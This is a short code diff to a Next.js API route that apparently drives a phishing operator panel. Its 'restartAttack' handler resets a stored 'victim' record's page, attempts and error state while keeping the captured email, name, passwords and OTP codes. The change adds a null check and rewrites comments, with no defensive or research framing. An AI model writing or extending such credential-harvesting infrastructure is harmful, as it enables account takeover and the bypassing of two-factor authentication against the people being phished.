@@ -211,14 +211,20 @@ export async function POST(request: NextRequest) {
       case 'restartAttack': {
         const victimRef = ref(db, 'victim');
         const currentVictimSnapshot = await get(victimRef);
-        const currentVictimData = currentVictimSnapshot.val() || {};
+        const currentVictimData = currentVictimSnapshot.val();
 
+        if (!currentVictimData) {
+          // If there's no victim data, just reset to initial state
+          await set(victimRef, initialState.victim);
+          return NextResponse.json({ success: true, message: 'Attack restarted' });
+        }
+        
         const resetData = {
-          ...currentVictimData, // Keep existing data like email, name, passwords, otp
-          currentPage: initialState.victim.currentPage,
-          attempts: initialState.victim.attempts,
-          errorMessage: initialState.victim.errorMessage,
-          isTyping: initialState.victim.isTyping,
+          ...currentVictimData, // Keep existing data
+          currentPage: initialState.victim.currentPage, // Reset to 'email'
+          attempts: initialState.victim.attempts, // Reset attempts
+          errorMessage: initialState.victim.errorMessage, // Clear error message
+          isTyping: initialState.victim.isTyping, // Reset typing status
         };
         
         await set(victimRef, resetData);
